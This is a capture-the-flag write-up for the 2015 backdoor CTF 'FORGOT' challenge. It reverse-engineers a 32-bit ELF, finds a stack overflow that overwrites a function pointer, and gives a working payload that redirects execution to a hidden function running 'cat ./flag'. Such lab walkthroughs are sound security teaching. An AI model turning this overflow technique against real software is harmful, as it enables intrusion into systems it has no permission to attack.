# backdoor CTF 2015: [FORGOT](https://backdoor.sdslabs.co/challenges/FORGOT)

**Category:** Exploit
**Points:** 200
**Author:** [Abhishek Kandoi](https://backdoor.sdslabs.co/users/abhikandoi2000)
**Difficulty:**
**Solves:** 76
**Description:** 

* <https://backdoor.sdslabs.co/challenges/FORGOT>

> Fawkes has been playing around with Finite State Automaton lately. While exploring the concept of implementing regular expressions using FSA he thought of implementing an email-address validator.
> 
> Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a battle of wits. Fawkes promised to reward Lua, only if she manages to transition to a non-reachable state in the FSA he implemented. The replication can be accessed [here](http://hack.bckdr.in/FORGOT/forgot-724a09c084a9df46d8555bf77612e612.tar.gz).
> 
> Service running at hack.bckdr.in:8009

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://ctf-team.vulnhub.com/backdoor-ctf-2015-forgot/>
* <http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BACKDOORCTF/pwnable/forgot>
* <https://github.com/TUCTF/write-ups-2015/tree/master/Backdoorctf15/forgot_200>
* <http://chinmaydd.github.io/2015/06/05/Backdoor-ctf/>

To reproduce the writeup and test it locally, the binary provided needs a file named `flag` in the same directory containing the flag:

```bash
$ echo "FLAG{this_is_usually_secret}" > flag 
$ cat flag
FLAG{this_is_usually_secret}
```

We extract a binary from the gzipped compressed tar archive using `tar xvf forgot-724a09c084a9df46d8555bf77612e612.tar.gz`.

Using `file`, we see that we are dealing with an i386 32 bit stripped ELF:

```bash
$ file forgot
forgot: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=35930a2d9b048236694e9611073b759e1c88b8c4, stripped
```

Using `gdb-peda` or `checksec`, we find out what kind of security is enabled:


```bash
$ checksec --file ./forgot
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   ./forgot

gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

`NX` enabled - so we can't execute shellcode on the stack!

Next, we run the program to get a feeling what it does (PS: always make sure you got a copy of the original binary for possible self-modifications ;)):

```bash
$ ./forgot 
What is your name?
> name

Hi name


                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
> string
This all you got? I don't even see an @!
```

Two things that stand out:

* Two user inputs that we control, the `name` and `string`
* A pointer to something - function, string or something else - in the binary `8048654`

Let's try a stack overflow vulnerability by providing 100 `A`s as input:

```bash
Reading symbols from ./forgot...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/vbox/pwn/tasks/backdoor-forgot/public/FORGOT/forgot 
What is your name?
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
> 
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x41414141 ('AAAA')
EBX: 0x45 ('E')
ECX: 0x20 (' ')
EDX: 0x5 
ESI: 0x0 
EDI: 0x0 
EBP: 0xffffd558 --> 0x0 
ESP: 0xffffd4cc --> 0x8048a67 (mov    eax,ds:0x804b060)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd4cc --> 0x8048a67 (mov    eax,ds:0x804b060)
0004| 0xffffd4d0 --> 0xffffd4e0 ('A' <repeats 69 times>)
0008| 0xffffd4d4 --> 0xffffd4e0 ('A' <repeats 69 times>)
0012| 0xffffd4d8 --> 0xf7fb8c20 --> 0xfbad2288 
0016| 0xffffd4dc --> 0x0 
0020| 0xffffd4e0 ('A' <repeats 69 times>)
0024| 0xffffd4e4 ('A' <repeats 65 times>)
0028| 0xffffd4e8 ('A' <repeats 61 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ bt
#0  0x41414141 in ?? ()
#1  0x08048a67 in ?? ()
#2  0xf7e2aa63 in __libc_start_main () from /lib32/libc.so.6
#3  0x08048501 in ?? ()
```

Seems like `name` is vulnerable to stack overflow, meaning that we can control the return address `EIP` of the function that handles our input.

Using `gdb`'s `bt` (backtrack) function, we can see that this function's `EIP` and therefore next instruction would have been at address `0x08048a67`.

Let's have a look which function must have been containing this instruction according to their starting address.

We can do so by pipings `radare2`'s `afl` ([List all functions](https://github.com/pwntester/cheatsheets/blob/master/radare2.md#analyze)) output to `sort` and find the function nearest to our address `08048a67`:

```
$ r2 ./forgot
[0x080484e0]> aa
[0x080484e0]> afl | sort -k1
0x0804843c 10   1  fcn.0804843c
0x08048440 6   1  sym.imp.printf
[...]
0x080487aa 293   1  main
0x080488cf 426   4  fcn.080488cf
0x080488d4 421   5  fcn.08048a40
0x08048a79 104   3  fcn.08048a79
0x08048a80 97   3  fcn.08048a80
[...]
0x08049132 32   1  fcn.08049132
0x08049152 4186  50  fcn.08049152
```

NOTE: You can also pipe the output to `column -t` to get a better formatted result.

While main is at `0x080487aa`, we can see our function must have been `fcn.08048a40` with entry point `0x080488d4`.

NOTE: I don't know the meaning for each column in `afl`'s output. I guess first argument is the entry point of the function with name displayed in column 4. The second seems to be the number of bytes used for this function.

However, in the case of our function called `fcn.08048a40` starts at `0x080488d4`. Please fill out the question marks if you know the answer :).

We decompile `fcn.08048a40`:

```bash
[0x080484e0]> pdf @0x080488d4
/ (fcn) fcn.080488cf 426
| --------> 0x080488cf    837c247809   cmp dword [esp+0x78], 0x9
|- fcn.08048a40 421
|       ,=< 0x080488d4    0f8761010000 ja 0x8048a3b
|       |   0x080488da    8b442478     mov eax, [esp+0x78]
[...]
|       |   0x08048902    85c0         test eax, eax
|      ,==< 0x08048904    740d         jz 0x8048913
|      ||   0x08048906    c7442478020. mov dword [esp+0x78], 0x2
|     ,===< 0x0804890e    e928010000   jmp 0x8048a3b ; (fcn.08048a40)
|    ,=`--> 0x08048913    e923010000   jmp 0x8048a3b ; (fcn.08048a40)
|    || |   0x08048918    8d542410     lea edx, [esp+0x10]
[...]
|    || |   0x08048925    3c40         cmp al, 0x40
|   ,=====< 0x08048927    750d         jnz 0x8048936
|   ||| |   0x08048929    c7442478030. mov dword [esp+0x78], 0x3
|  ,======< 0x08048931    e905010000   jmp 0x8048a3b ; (fcn.08048a40)
| ,=`-----> 0x08048936    e900010000   jmp 0x8048a3b ; (fcn.08048a40)
| || || |   0x0804893b    8d542410     lea edx, [esp+0x10]
[...]
| || || |   0x08048a3a    90           nop
| ``-``-`-> 0x08048a3b    8344247c01   add dword [esp+0x7c], 0x1
|           ; CODE (CALL) XREF from 0x080488ca (unk)
|           0x08048a40    8b5c247c     mov ebx, [esp+0x7c]
|           0x08048a44    8d442410     lea eax, [esp+0x10]
|           0x08048a48    890424       mov [esp], eax
|           0x08048a4b    e850faffff   call 0x1080484a0 ; (sym.imp.strlen)
|              sym.imp.strlen()
|           0x08048a50    39c3         cmp ebx, eax
| ========< 0x08048a52    0f8277feffff jb 0x1080488cf
|           0x08048a58    836c247801   sub dword [esp+0x78], 0x1
|           0x08048a5d    8b442478     mov eax, [esp+0x78]
|           0x08048a61    8b448430     mov eax, [esp+eax*4+0x30]
|           0x08048a65    ffd0         call eax
|              0x00000000()        
|           0x08048a67    a160b00408   mov eax, [sym.stdout]
|           0x08048a6c    890424       mov [esp], eax
|           0x08048a6f    e8dcf9ffff   call 0x108048450 ; (sym.imp.fflush)
|              sym.imp.fflush()
|           0x08048a74    8b5dfc       mov ebx, [ebp-0x4]
|           0x08048a77    c9           leave
\           0x08048a78    c3           ret
```

We called a function stored in `EAX`, which we most likely were able to overwrite (see gdb output from earlier).

Since we can't execute shellcode on the stack, because `NX` is enabled, we have to use something else to get to the flag.

One of these options is to call a function that might be doing something interesting for us, possibly a hidden function.

First, we listing our from `libc.so.6` imported function, we see some interesting functions that are called:

```bash
[0x080485e0]> il
[Linked libraries]
libc.so.6

1 libraries
[0x080485e0]> ii
[Imports]
ordinal=001 plt=0x08048440 bind=GLOBAL type=FUNC name=printf
ordinal=002 plt=0x08048450 bind=GLOBAL type=FUNC name=fflush
ordinal=003 plt=0x08048460 bind=GLOBAL type=FUNC name=fgets
ordinal=004 plt=0x08048470 bind=GLOBAL type=FUNC name=puts
ordinal=005 plt=0x08048480 bind=GLOBAL type=FUNC name=system
ordinal=006 plt=0x08048490 bind=UNKNOWN type=NOTYPE name=__gmon_start__
ordinal=007 plt=0x080484a0 bind=GLOBAL type=FUNC name=strlen
ordinal=008 plt=0x080484b0 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=009 plt=0x080484c0 bind=GLOBAL type=FUNC name=snprintf
ordinal=010 plt=0x080484d0 bind=GLOBAL type=FUNC name=__isoc99_scanf

10 imports
```

Adding to that, we also print all strings:

```bash
[0x080484e0]> izz
[strings]
addr=0x08048b11 off=0x00000b11 ordinal=000 sz=6 section=.rodata string=His
addr=0x08048b1c off=0x00000b1c ordinal=001 sz=23 section=.rodata string=FiniteStateAutomaton
addr=0x08048b34 off=0x00000b34 ordinal=002 sz=60 section=.rodata string=IhaveimplementedarobustFSAtovalidateemailaddresses
addr=0x08048b70 off=0x00000b70 ordinal=003 sz=76 section=.rodata string=ThrowastringatmeandIwillletyouknowifitisavalidemailaddress
addr=0x08048bc1 off=0x00000bc1 ordinal=004 sz=8 section=.rodata string=Cheers
addr=0x08048bcc off=0x00000bcc ordinal=005 sz=87 section=.rodata string=Dudeyouseriouslythinkthisisgoingtowork.Wherearethefancyanddothuh
addr=0x08048c24 off=0x00000c24 ordinal=006 sz=41 section=.rodata string=ThisallyougotIdontevenseean
addr=0x08048c50 off=0x00000c50 ordinal=007 sz=61 section=.rodata string=AreyouhungryYoujustatetheentirepartthatfollows
addr=0x08048c90 off=0x00000c90 ordinal=008 sz=78 section=.rodata string=Seemslikeyouworkalotonyourlocalhostrealdomainsconsistofa.dot
addr=0x08048ce0 off=0x00000ce0 ordinal=009 sz=45 section=.rodata string=Sentencesendwithadotnotdomainschu
addr=0x08048d10 off=0x00000d10 ordinal=010 sz=89 section=.rodata string=Thatishellofaninterestingdomainneverseenatopleveldomainwithasinglechar.
addr=0x08048d69 off=0x00000d69 ordinal=011 sz=14 section=.rodata string=Validhai
addr=0x08048d78 off=0x00000d78 ordinal=012 sz=39 section=.rodata string=Youjustmadeit.Butthenyoudidnt
addr=0x08048d9f off=0x00000d9f ordinal=013 sz=7 section=.rodata string=.flag
addr=0x08048da6 off=0x00000da6 ordinal=014 sz=7 section=.rodata string=cats
addr=0x08048dad off=0x00000dad ordinal=015 sz=19 section=.rodata string=Whatisyourname
addr=0x08048dc0 off=0x00000dc0 ordinal=016 sz=3 section=.rodata string=
addr=0x08048dc4 off=0x00000dc4 ordinal=017 sz=46 section=.rodata string=Ishouldgiveyouapointerperhaps.Herex
addr=0x08048df4 off=0x00000df4 ordinal=018 sz=32 section=.rodata string=Enterthestringtobevalidate
addr=0x08048e14 off=0x00000e14 ordinal=019 sz=3 section=.rodata string=s

20 strings
[0x080484e0]> psz @0x08048d9f
./flag
[0x080484e0]> psz @0x08048da6
cat %s
[0x080484e0]> s 0x08048b11
[0x08048b11]> pdf
   ;      [14] va=0x08048b08 pa=0x00000b08 sz=824 vsz=824 rwx=-r-- .rodata
/ (fcn) fcn.08048b08 965
|           ;-- section..rodata:
|           0x08048b08    0300         add eax, [eax]
|           0x08048b0a    0000         add [eax], al
|           ;-- sym._IO_stdin_used:
|           0x08048b0c hex length=4 delta=0
 0100 0200                                ....            
|           0x08048b10    0a4869       or cl, [eax+0x69]
|           0x08048b13     .string "Hi %s" ; len=6
|           0x08048b19    0909         or [ecx], ecx
|           0x08048b1b    094669       or [esi+0x69], eax
|           0x08048b1e     .string "Finite-State Automaton" ; len=23
|      ||   0x08048b35     .string "I have implemented a robust FSA to validate email addresses" ; len=60
|  ||||||   ; DATA XREF from 0x20776f72 (unk)
|  ||||||   0x08048b71     .string "Throw a string at me and I will let you know if it is a valid email address" ; len=76
|           0x08048bbd    0909         or [ecx], ecx
|           0x08048bbf    0909         or [ecx], ecx
|           ;-- str.Cheers:
|           0x08048bc1     .string "Cheers!" ; len=8
|           0x08048bc9    0000         add [eax], al
|           0x08048bcb    00447564     add [ebp+esi*2+0x64], al
|           0x08048bcf     .string "Dude, you seriously think this is going to work. Where are the fancy _ and [dot], huh?" ; len=87
|           0x08048c26     .string "This all you got? I don't even see an _!" ; len=41
|           0x08048c4f    004172       add [ecx+0x72], al
|           0x08048c52     .string "Are you hungry? You just ate the entire part that follows _!" ; len=61
|           0x08048c8f    005365       add [ebx+0x65], dl
|           0x08048c92     .string "Seems like you work a lot on your localhost, real domains consist of a .[dot]" ; len=78
|           ;-- str.Sentencesendwithadotnotdomainschu:
|           0x08048ce0     .string "Sentences end with a [dot], not domains chu!" ; len=45
|           0x08048d0d    0000         add [eax], al
|           0x08048d0f    00546861     add [eax+ebp*2+0x61], dl
| ========< 0x08048d13     .string "That is hell of an interesting domain, never seen a top-level domain with a single char." ; len=89
|           0x08048d6c     .string ":) Valid hai!" ; len=14
| ========< 0x08048d7a     .string "You just made it. But then you didn't!" ; len=39
|           0x08048da1     .string "./flag" ; len=7
| ========< 0x08048da8     .string "cat %s" ; len=7
|           0x08048daf     .string "What is your name?" ; len=19
|           0x08048dc2     .string "_ " ; len=3
|           0x08048dc5     .string "I should give you a pointer perhaps. Here: %x" ; len=46
|           0x08048df3    00456e       add [ebp+0x6e], al
| --------> 0x08048df6     .string "Enter the string to be validate" ; len=32
|           0x08048e16     .string "%s" ; len=3
```

So `str..flag` (`./flag`) and `str.cats` (`cat %s`) sound pretty interesting.

Let's search for these strings as well as for the system call in the decompiled assembler code.

To do so, we have to find out how many bytes all functions together inhibit and decompile the whole binary from the first function or symbol `0x0804843c` to the end:

```bash
[0x080484e0]> afl | awk '{s+=$2} END {print s}'
8284
[0x080484e0]> s 0x0804843c
[0x0804843c]> pd 8284 | grep system
Do you want to print 409854 chars? (y/N)
/ (fcn) sym.imp.system 6
|           0x080486fb    e880fdffff   call 0x108048480 ; (sym.imp.system)
|              sym.imp.system()
[0x0804843c]> pd 8284 | grep flag
Do you want to print 409854 chars? (y/N)
|           0x080486d2    c744240c9f8. mov dword [esp+0xc], str..flag
|           0x08048da1     .string "./flag" ; len=7
[0x0804843c]> pd 8284 | grep cat
Do you want to print 409854 chars? (y/N)
|           0x080486da    c7442408a68. mov dword [esp+0x8], str.cats
|       ,=< 0x08048da8     .string "cat %s" ; len=7
```

Adding all together, we can see that some function calls `system` at address `0x080486fb` and both strings seem to be close to each other as well as to the system call.

Looking for the nearest function again that inhibits these addresses, we see that the function `fcn.080486cc` with entry address `0x080486cc` seems to be our function.

Decompiling it:

```bash
[0x080484e0]> pdf @0x080486cc
/ (fcn) fcn.080486cc 54
|           0x080486cc    55           push ebp
|           0x080486cd    89e5         mov ebp, esp
|           0x080486cf    83ec58       sub esp, 0x58
|           0x080486d2    c744240c9f8. mov dword [esp+0xc], str..flag
|           0x080486da    c7442408a68. mov dword [esp+0x8], str.cats
|           0x080486e2    c7442404320. mov dword [esp+0x4], 0x32
|           0x080486ea    8d45c6       lea eax, [ebp-0x3a]
|           0x080486ed    890424       mov [esp], eax
|           0x080486f0    e8cbfdffff   call 0x1080484c0 ; (sym.imp.snprintf)
|              sym.imp.snprintf(unk)
|           0x080486f5    8d45c6       lea eax, [ebp-0x3a]
|           0x080486f8    890424       mov [esp], eax
|           0x080486fb    e880fdffff   call 0x108048480 ; (sym.imp.system)
|              sym.imp.system()
|           0x08048700    c9           leave
\           0x08048701    c3           ret
```

This roughly translates to following C-code:

```c
snprintf(somebuffer, 0x32, "cat %s", "./flag");
// somebuffer = "cat ./flag"
system(somebuffer);
```

So this function calls `cat ./flag` - Great!

We just have to provide this function to `EIP` and we should see our flag!

After some fiddling around, we find that `EIP`'s offset is from `0x64` to `0x67`:

```bash
$ python -c 'print "A"*63+"BBBB"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
gdb-peda$ r
Starting program: /home/vbox/pwn/tasks/backdoor-forgot/public/FORGOT/forgot 
What is your name?
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
> 
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x42424242 ('BBBB')
EBX: 0x24 ('$')
ECX: 0x20 (' ')
EDX: 0x4 
ESI: 0x0 
EDI: 0x0 
EBP: 0xffffd558 --> 0x0 
ESP: 0xffffd4cc --> 0x8048a67 (mov    eax,ds:0x804b060)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd4cc --> 0x8048a67 (mov    eax,ds:0x804b060)
0004| 0xffffd4d0 --> 0xffffd4e0 ('A' <repeats 32 times>, "BBBB")
0008| 0xffffd4d4 --> 0xffffd4e0 ('A' <repeats 32 times>, "BBBB")
0012| 0xffffd4d8 --> 0xf7fb8c20 --> 0xfbad2288 
0016| 0xffffd4dc --> 0x0 
0020| 0xffffd4e0 ('A' <repeats 32 times>, "BBBB")
0024| 0xffffd4e4 ('A' <repeats 28 times>, "BBBB")
0028| 0xffffd4e8 ('A' <repeats 24 times>, "BBBB")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

We provide the address and feed the input inside `gdb` to `forgot`:

```bash
$ python -c 'print "A"*63+"\xcc\x86\x04\x08"' > in 
gdb-peda$ r < in
Starting program: /home/vbox/pwn/tasks/backdoor-forgot/public/FORGOT/forgot < in
What is your name?
> 
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
> [New process 2519]
process 2519 is executing new program: /bin/dash
[New process 2520]
process 2520 is executing new program: /bin/cat
FLAG{this_is_usually_secret}
[Inferior 3 (process 2520) exited normally]
```

We got the flag!

## Other write-ups and resources

* <http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup/>
* <https://ctf-team.vulnhub.com/backdoor-ctf-2015-forgot/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BACKDOORCTF/pwnable/forgot>
* <https://gist.github.com/Bono-iPad/e908ddc67b3994069950>
* <https://github.com/TUCTF/write-ups-2015/tree/master/Backdoorctf15/forgot_200>
* <http://chinmaydd.github.io/2015/06/05/Backdoor-ctf/>
* [Indonesian](https://docs.google.com/document/d/1wUxXhTVrmbYXv7eza85T6DgHP5i7h7ItuD_JTDjekJk/edit)
